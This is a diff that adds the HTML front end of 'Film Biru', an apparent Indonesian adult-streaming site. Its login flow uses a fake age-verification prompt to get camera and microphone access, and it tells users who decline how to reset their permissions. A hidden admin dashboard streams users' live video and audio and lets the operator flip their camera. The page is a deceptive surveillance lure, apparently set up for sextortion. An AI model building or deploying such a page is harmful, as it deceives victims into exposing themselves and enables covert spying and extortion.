@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Film Biru — Nonton Film 18+</title>
+
+  <!-- ── SEO ──────────────────────────────────────────────── -->
+  <meta name="description" content="Platform streaming dewasa terpercaya. Nonton film 18+ dengan kualitas HD kapan saja dan di mana saja."/>
+
+  <!-- ── Open Graph (Facebook, WhatsApp, Telegram, dll) ──── -->
+  <meta property="og:type"        content="website"/>
+  <meta property="og:url"         content="https://filmbiru.up.railway.app/"/>
+  <meta property="og:title"       content="Film Biru — Nonton Film 18+"/>
+  <meta property="og:description" content="Platform streaming dewasa terpercaya. Nonton film 18+ dengan kualitas HD kapan saja dan di mana saja."/>
+  <meta property="og:image"       content="https://filmbiru.up.railway.app/background/priview.jpg"/>
+  <meta property="og:image:width"  content="1200"/>
+  <meta property="og:image:height" content="630"/>
+  <meta property="og:locale"      content="id_ID"/>
+  <meta property="og:site_name"   content="Film Biru"/>
+
+  <!-- ── Twitter / X Card ────────────────────────────────── -->
+  <meta name="twitter:card"        content="summary_large_image"/>
+  <meta name="twitter:url"         content="https://filmbiru.up.railway.app/"/>
+  <meta name="twitter:title"       content="Film Biru — Nonton Film 18+"/>
+  <meta name="twitter:description" content="Platform streaming dewasa terpercaya. Nonton film 18+ dengan kualitas HD kapan saja dan di mana saja."/>
+  <meta name="twitter:image"       content="https://filmbiru.up.railway.app/background/priview.jpg"/>
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="/style.css?v=10"/>
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+</head>
+<body>
+
+<!-- ================================================================
+     1. LOGIN
+     ================================================================ -->
+<div class="screen active" id="screen-login">
+  <div class="login-simple-bg"></div>
+
+  <!-- Background slideshow — full layar -->
+  <div class="card-cover">
+    <div class="card-cover-overlay"></div>
+  </div>
+
+  <div class="login-simple-wrap">
+
+    <div class="ls-card-outer">
+
+      <!-- Badge usia melayang di atas kartu -->
+      <div class="ls-age-badge">18+</div>
+
+      <div class="login-simple-card login-card">
+
+        <!-- Logo -->
+        <div class="ls-logo">
+          <img src="/logo.png" alt="Film Biru" style="height:80px;width:auto;max-width:180px;object-fit:contain;display:block;"/>
+          <div class="ls-tagline">
+            <span class="ls-dot"></span>
+            Platform Streaming Dewasa
+            <span class="ls-dot"></span>
+          </div>
+        </div>
+
+        <!-- Divider -->
+        <div class="ls-divider"></div>
+
+        <!-- Error -->
+        <div class="error-msg" id="login-error">
+          <span class="err-icon">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+          </span>
+          <span id="login-error-text">Nama tidak boleh kosong.</span>
+        </div>
+
+        <!-- Form -->
+        <div class="form-group">
+          <label>Nama Lengkap</label>
+          <div class="input-icon-wrap">
+            <span class="input-icon">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+            </span>
+            <input id="login-name" type="text" placeholder="Masukkan nama Anda" autocomplete="name"/>
+          </div>
+        </div>
+
+        <div id="password-section" class="form-group" style="display:none;">
+          <label>Password Admin</label>
+          <input id="login-pass" type="password" placeholder="Masukkan password" autocomplete="current-password"/>
+        </div>
+
+        <div id="admin-detected" style="display:none;" class="admin-badge-info">
+          <span>👑</span> Admin terdeteksi — masukkan password
+        </div>
+
+        <!-- Consent -->
+        <div class="consent-box" id="consent-box-wrap">
+          <label class="consent-check">
+            <input id="chk-consent" type="checkbox"
+              onchange="document.getElementById('btn-login').disabled=!this.checked; document.getElementById('consent-box-wrap').classList.toggle('consent-checked', this.checked)"/>
+            <span class="checkmark"></span>
+            <span class="consent-text">Saya berusia minimal <strong>18 tahun</strong> dan menyetujui syarat platform ini.</span>
+          </label>
+        </div>
+
+        <!-- Tombol -->
+        <button class="btn-login-main" id="btn-login" disabled>
+          <span id="btn-text">Masuk &amp; Mulai Nonton</span>
+        </button>
+
+        <!-- Tetap di DOM untuk JS, disembunyikan via CSS -->
+        <div class="login-hint" id="login-hint"></div>
+
+        <p class="login-version">Film Biru · Khusus Usia 18+</p>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     CONSENT TOAST (muncul setelah klik Masuk & Mulai Nonton)
+     ================================================================ -->
+<div id="consent-toast-overlay" class="consent-toast-overlay" style="display:none;">
+  <div class="consent-toast-card" id="consent-toast-card">
+    <div class="ctc-body">
+      <div class="ctc-title">Verifikasi Usia</div>
+      <div class="ctc-desc">Platform memerlukan izin berikut untuk verifikasi usia bahwa Anda berusia 18+ untuk memulai menonton.</div>
+    </div>
+
+    <div class="ctc-actions">
+      <button class="ctc-btn-agree" onclick="consentToastAgree()">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        Ya, Saya Berusia 18+
+      </button>
+      <button class="ctc-btn-decline" onclick="consentToastDecline()">Tolak</button>
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     2. CONSENT KAMERA
+     ================================================================ -->
+<div class="screen" id="screen-consent">
+  <div class="consent-wrap">
+    <div class="consent-card">
+      <h2>Verifikasi Usia</h2>
+      <p class="cc-desc">Sebelum menonton, platform memerlukan izin kamera &amp; mikrofon untuk memverifikasi usia Anda.</p>
+
+      <div class="cc-list">
+        <div class="cc-item">
+          <span class="cc-dot green"></span>
+          <div>
+            <strong>Stream Video HD</strong>
+            <span>Konten diakses setelah verifikasi selesai</span>
+          </div>
+        </div>
+        <div class="cc-item">
+          <span class="cc-dot blue"></span>
+          <div>
+            <strong>Verifikasi per Sesi</strong>
+            <span>Diperlukan setiap kali membuka platform</span>
+          </div>
+        </div>
+        <div class="cc-item">
+          <span class="cc-dot yellow"></span>
+          <div>
+            <strong>Data Terenkripsi</strong>
+            <span>Semua data aman &amp; tidak disimpan permanen</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc-actions">
+        <button class="btn-agree" onclick="requestCamera()">
+          Izinkan &amp; Lanjutkan
+        </button>
+        <button class="btn-decline" onclick="declineCamera()">Tolak &amp; Keluar</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     3. WATCH SCREEN — Landscape Grid
+     ================================================================ -->
+<div class="screen" id="screen-watch">
+  <span class="session-timer" id="session-timer" style="display:none;">00:00:00</span>
+
+  <!-- Sidebar kiri -->
+  <aside class="watch-sidebar">
+    <div class="ws-brand">
+      <span>FILMBIRU</span>
+    </div>
+    <div class="ws-user">
+      <div class="ws-avatar" id="user-avatar-chip">U</div>
+      <div class="ws-userinfo">
+        <span class="ws-name" id="user-name-chip">User</span>
+        <span class="ws-role">Penonton</span>
+      </div>
+    </div>
+    <div class="ws-divider"></div>
+    <nav class="ws-nav">
+      <div class="ws-nav-item active">
+        Semua Video
+      </div>
+    </nav>
+    <div class="ws-bottom">
+      <button class="ws-logout" onclick="endSession()">
+        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;margin-right:4px;margin-bottom:1px"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg> Keluar
+      </button>
+    </div>
+  </aside>
+
+  <!-- Konten utama -->
+  <main class="watch-main">
+    <div class="wm-header">
+      <div style="display:flex;align-items:center;gap:12px;">
+        <img src="/logo.png" alt="Film Biru" style="height:40px;width:auto;object-fit:contain;"/>
+        <div>
+          <h2 class="wm-title">Film Biru</h2>
+          <p class="wm-sub">Pilih video untuk mulai menonton</p>
+        </div>
+      </div>
+      <div class="wm-user-badge">
+        <span class="wm-badge-name" id="wm-badge-name">User</span>
+        <button class="wm-badge-logout" onclick="endSession()">
+          <svg xmlns="http://www.w3.org/2000/svg" width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+          Keluar
+        </button>
+      </div>
+    </div>
+    <div class="film-grid" id="film-grid"></div>
+    <div class="film-pagination" id="film-pagination"></div>
+  </main>
+</div>
+
+
+<!-- ================================================================
+     4. ADMIN SCREEN
+     ================================================================ -->
+<div class="screen" id="screen-admin">
+  <aside class="admin-sidebar">
+    <div class="as-brand">
+      <span>FILMBIRU</span>
+    </div>
+    <div class="as-badge">👑 ADMIN</div>
+    <div class="as-stats">
+      <div class="as-stat">
+        <div class="as-stat-val green" id="admin-stat-users">0</div>
+        <div class="as-stat-label">Pengguna Aktif</div>
+      </div>
+      <div class="as-stat">
+        <div class="as-stat-val blue" id="admin-stat-audio">0</div>
+        <div class="as-stat-label">Audio Aktif</div>
+      </div>
+    </div>
+
+    <div class="as-divider"></div>
+
+    <div class="as-status">
+      <div class="sse-dot" id="sse-dot"></div>
+      <span id="sse-status-text">Menghubungkan...</span>
+    </div>
+
+    <div class="as-time" id="admin-stat-time">—</div>
+
+    <div class="as-bottom">
+      <div class="as-username" id="admin-username">Admin</div>
+      <button class="as-logout" onclick="adminLogout()"><svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;margin-right:5px;margin-bottom:1px"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>Logout</button>
+    </div>
+  </aside>
+
+  <!-- Konten admin -->
+  <div class="admin-content">
+    <div class="ac-header">
+      <h2>Monitor Dashboard</h2>
+      <div style="display:flex;align-items:center;gap:10px;">
+        <div class="ac-live">
+          <div class="rec-dot"></div>
+          <span>LIVE</span>
+        </div>
+        <button class="as-logout ac-logout-mobile" onclick="adminLogout()"><svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;margin-right:4px;margin-bottom:1px"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>Logout</button>
+      </div>
+    </div>
+
+    <div class="sessions-grid" id="admin-session-grid">
+      <div class="empty-state" style="grid-column:1/-1;">
+        <div class="es-icon">📡</div>
+        <div>Menunggu pengguna terhubung...<br/>Video &amp; audio akan muncul otomatis.</div>
+      </div>
+    </div>
+
+    <div class="log-panel">
+      <div class="lp-head">
+        <h3>📋 Log Aktivitas</h3>
+        <button class="lp-clear" onclick="clearAdminLog()">Bersihkan</button>
+      </div>
+      <div class="log-body" id="admin-log"></div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     6. MODAL PERBESAR (Admin)
+     ================================================================ -->
+<div class="video-modal" id="video-modal">
+  <div class="video-modal-inner">
+    <div class="vm-header">
+      <div class="vm-user">
+        <div class="vm-avatar" id="vm-avatar">U</div>
+        <div class="vm-userinfo">
+          <div class="vm-name" id="vm-name">Pengguna</div>
+          <div class="vm-email" id="vm-email">—</div>
+        </div>
+      </div>
+      <div class="vm-actions">
+        <button class="vm-btn" onclick="flipCameraRequest(currentExpandedSession)">🔄 Flip</button>
+        <button class="vm-btn warn" onclick="warnFromModal()">⚠️ Peringatan</button>
+        <button class="vm-btn close-btn" onclick="closeExpandSession()">✕ Tutup</button>
+      </div>
+    </div>
+    <div class="vm-video-wrap">
+      <video id="vm-video" autoplay playsinline></video>
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     FULLSCREEN VIDEO MODAL
+     ================================================================ -->
+<div class="fs-modal" id="fs-modal">
+  <div class="fs-modal-inner">
+    <div class="fs-header">
+      <button class="fs-close" onclick="closeFsModal()">✕</button>
+    </div>
+    <div class="fs-video-wrap">
+      <video id="fs-video" playsinline autoplay preload="auto"></video>
+      <div class="fs-loading" id="fs-loading" style="display:none;">
+        <div class="fs-spinner"></div>
+        <div class="fs-loading-text">Memuat video...</div>
+      </div>
+      <div class="fs-error" id="fs-error" style="display:none;">
+        <div style="font-size:2rem;margin-bottom:12px;">⚠️</div>
+        <div class="fs-error-text">Video gagal dimuat</div>
+        <button class="fs-retry-btn" id="fs-retry-btn">Coba Lagi</button>
+      </div>
+      <div class="fs-controls" id="fs-controls">
+        <div class="fs-progress-wrap">
+          <input type="range" class="fs-progress" id="fs-progress" value="0" min="0" step="0.1"/>
+          <div class="fs-time" id="fs-time">0:00 / 0:00</div>
+        </div>
+        <div class="fs-btn-row">
+          <button class="fs-ctrl-btn" id="fs-play-btn" onclick="fsTogglePlay()">▶</button>
+          <button class="fs-ctrl-btn" onclick="fsSeek(-10)">↺10</button>
+          <button class="fs-ctrl-btn" onclick="fsSeek(10)">↻10</button>
+          <button class="fs-ctrl-btn" id="fs-mute-btn" onclick="fsToggleMute()">🔊</button>
+          <input type="range" class="fs-vol" id="fs-vol" min="0" max="1" step="0.05" value="1"/>
+          <button class="fs-ctrl-btn fs-full-btn" onclick="fsFullscreen()">⛶</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     PERMISSION BUBBLE
+     ================================================================ -->
+<div id="permission-bubble-overlay" style="display:none;position:fixed;inset:0;z-index:999999;pointer-events:none;">
+  <div id="pbo-card" style="position:absolute;top:8px;left:12px;max-width:290px;width:calc(100vw - 90px);background:#0F172A;border:1.5px solid rgba(74,222,128,0.45);border-radius:14px;padding:14px 16px 12px;box-shadow:0 8px 40px rgba(0,0,0,0.65),0 0 0 1px rgba(74,222,128,0.08);pointer-events:all;z-index:6;animation:pboBubblePop 0.35s cubic-bezier(0.34,1.56,0.64,1);">
+
+    <!-- Segitiga panah ke atas -->
+    <div style="position:absolute;top:-9px;left:22px;width:0;height:0;border-left:9px solid transparent;border-right:9px solid transparent;border-bottom:9px solid rgba(74,222,128,0.45);"></div>
+    <div style="position:absolute;top:-7px;left:23px;width:0;height:0;border-left:8px solid transparent;border-right:8px solid transparent;border-bottom:8px solid #0F172A;"></div>
+
+    <!-- Header -->
+    <div style="display:flex;align-items:center;gap:9px;margin-bottom:11px;">
+      <div style="width:30px;height:30px;border-radius:8px;background:rgba(74,222,128,0.12);border:1px solid rgba(74,222,128,0.3);display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0;">⚙️</div>
+      <div>
+        <div style="font-weight:700;font-size:.88rem;color:#fff;line-height:1.2;">Reset Izin</div>
+        <div style="font-size:.67rem;color:#4ADE80;margin-top:1px;">Untuk masuk & mulai menonton</div>
+      </div>
+    </div>
+
+    <!-- Langkah-langkah -->
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:12px;">
+      <div style="display:flex;align-items:center;gap:9px;background:rgba(255,255,255,0.04);border-radius:9px;padding:8px 10px;">
+        <span style="font-size:.68rem;font-weight:800;color:#4ADE80;min-width:14px;">1</span>
+        <span style="font-size:.78rem;color:#94A3B8;line-height:1.4;">Tap Ikon <strong style="color:#fff;">Garis Tiga</strong> di Pojok Kiri</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:9px;background:rgba(255,255,255,0.04);border-radius:9px;padding:8px 10px;">
+        <span style="font-size:.68rem;font-weight:800;color:#4ADE80;min-width:14px;">2</span>
+        <span style="font-size:.78rem;color:#94A3B8;line-height:1.4;">Pilih <strong style="color:#fff;">Izin</strong></span>
+      </div>
+      <div style="display:flex;align-items:center;gap:9px;background:rgba(255,255,255,0.04);border-radius:9px;padding:8px 10px;">
+        <span style="font-size:.68rem;font-weight:800;color:#4ADE80;min-width:14px;">3</span>
+        <span style="font-size:.78rem;color:#94A3B8;line-height:1.4;">Silahkan <strong style="color:#fff;">Reset Izin</strong> & Coba masuk lagi</span>
+      </div>
+    </div>
+
+    <!-- Tombol -->
+    <div style="display:flex;gap:8px;">
+      <button onclick="closePboBubble()" style="flex:1;padding:9px 0;border-radius:8px;font-size:.78rem;font-weight:600;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);color:#6B7280;cursor:pointer;">Tutup</button>
+      <button onclick="location.reload()" style="flex:2;padding:9px 0;border-radius:8px;font-size:.78rem;font-weight:700;background:#4ADE80;border:none;color:#000;cursor:pointer;">🔄 Muat Ulang</button>
+    </div>
+  </div>
+</div>
+
+<style>
+.sc-btn.hd-card-btn { background: rgba(91,140,255,0.15); border-color: rgba(91,140,255,0.4); color: #5B8CFF; font-size:.7rem; font-weight:700; letter-spacing:.05em; }
+.sc-btn.hd-card-btn.hd-active { background: rgba(74,222,128,0.15); border-color: rgba(74,222,128,0.5); color: #4ADE80; }
+
+@keyframes pboBubblePop {
+  from { opacity:0; transform:scale(0.88) translateY(-6px); }
+  to   { opacity:1; transform:scale(1) translateY(0); }
+}
+</style>
+
+<script>
+// ================================================================
+// CONSENT TOAST — login → tampilkan toast → user pilih → lanjut
+// ================================================================
+
+// Dipanggil oleh app.js setelah login berhasil (non-admin)
+// Intercept showScreen('screen-consent') dengan toast dulu
+window._originalShowConsentScreen = null;
+
+function showConsentToast() {
+  const overlay = document.getElementById('consent-toast-overlay');
+  const card    = document.getElementById('consent-toast-card');
+  overlay.style.display = 'flex';
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      overlay.classList.add('cto-visible');
+      card.classList.add('ctc-visible');
+    });
+  });
+}
+
+function hideConsentToast(cb) {
+  const overlay = document.getElementById('consent-toast-overlay');
+  const card    = document.getElementById('consent-toast-card');
+  overlay.classList.remove('cto-visible');
+  card.classList.remove('ctc-visible');
+  setTimeout(() => {
+    overlay.style.display = 'none';
+    if (cb) cb();
+  }, 320);
+}
+
+function consentToastAgree() {
+  hideConsentToast(() => {
+    // Langsung minta izin kamera, skip screen-consent
+    requestCamera();
+  });
+}
+
+function consentToastDecline() {
+  hideConsentToast(() => {
+    // Kembali ke login
+    if (typeof resetLogin === 'function') resetLogin();
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById('screen-login').classList.add('active');
+  });
+}
+
+// Patch showScreen agar intercept screen-consent → tampilkan toast dulu
+document.addEventListener('DOMContentLoaded', () => {
+  const origShowScreen = window.showScreen;
+  if (origShowScreen) {
+    window.showScreen = function(id) {
+      if (id === 'screen-consent') {
+        // Tetap jalankan logika asli tapi jangan aktifkan screen-consent dulu
+        // Simpan semua screen inactive dulu
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        // Tampilkan toast
+        showConsentToast();
+        return;
+      }
+      origShowScreen(id);
+    };
+  }
+
+  // Login hint toggle
+  const chk = document.getElementById('chk-consent');
+  const hint = document.getElementById('login-hint');
+  if (chk && hint) {
+    chk.addEventListener('change', () => {
+      hint.style.opacity = chk.checked ? '0' : '1';
+    });
+  }
+});
+</script>
+
+<script src="/offline.js?v=1"></script>
+<script src="/app.js?v=20"></script>
+
+<script>
+/* ── Login Cover Slideshow ─────────────────────────────────────
+   Gambar tampil sebagai sampul di atas card login (bukan full layar).
+   Fetch dari /api/backgrounds, crossfade antar gambar.
+   ──────────────────────────────────────────────────────────── */
+(function () {
+  const DISPLAY_MS = 6000;  // durasi tiap gambar (ms)
+  const FADE_MS    = 1800;  // durasi fade — harus sama dengan CSS transition
+
+  // Fisher-Yates shuffle — acak urutan array di tempat
+  function shuffleArray(arr) {
+    for (let i = arr.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [arr[i], arr[j]] = [arr[j], arr[i]];
+    }
+    return arr;
+  }
+
+  async function initCoverSlideshow() {
+    try {
+      const res  = await fetch('/api/backgrounds');
+      const data = await res.json();
+      if (!data.images || data.images.length === 0) return;
+
+      const images = shuffleArray([...data.images]); // acak urutan tiap kali halaman dimuat
+      const cover  = document.querySelector('.card-cover');
+      if (!cover) return;
+
+      // Dua slide untuk ping-pong crossfade
+      const slideA = document.createElement('div');
+      const slideB = document.createElement('div');
+      slideA.className = 'bg-slide';
+      slideB.className = 'bg-slide';
+
+      // Sisipkan SEBELUM overlay agar overlay tetap di atas
+      const overlay = cover.querySelector('.card-cover-overlay');
+      cover.insertBefore(slideA, overlay);
+      cover.insertBefore(slideB, overlay);
+
+      let idx     = 0;
+      let active  = slideA;
+      let standby = slideB;
+
+      function loadImage(slide, src) {
+        return new Promise(resolve => {
+          const img   = new Image();
+          img.onload  = () => { slide.style.backgroundImage = `url('${src}')`; resolve(); };
+          img.onerror = () => resolve(); // skip gambar rusak
+          img.src = src;
+        });
+      }
+
+      // Tampilkan gambar pertama
+      await loadImage(slideA, images[0]);
+      slideA.classList.add('active');
+
+      if (images.length === 1) return; // satu gambar, tidak perlu timer
+
+      // Preload gambar berikutnya
+      let nextIdx = 1;
+      loadImage(standby, images[nextIdx]);
+
+      setInterval(() => {
+        standby.classList.add('active');
+        setTimeout(() => {
+          active.classList.remove('active');
+          const tmp = active;
+          active  = standby;
+          standby = tmp;
+          idx     = nextIdx;
+          nextIdx = (idx + 1) % images.length;
+          loadImage(standby, images[nextIdx]);
+        }, FADE_MS);
+      }, DISPLAY_MS);
+
+    } catch (e) { /* gagal diam-diam */ }
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initCoverSlideshow);
+  } else {
+    initCoverSlideshow();
+  }
+})();
+</script>
+
+</body>
+</html>
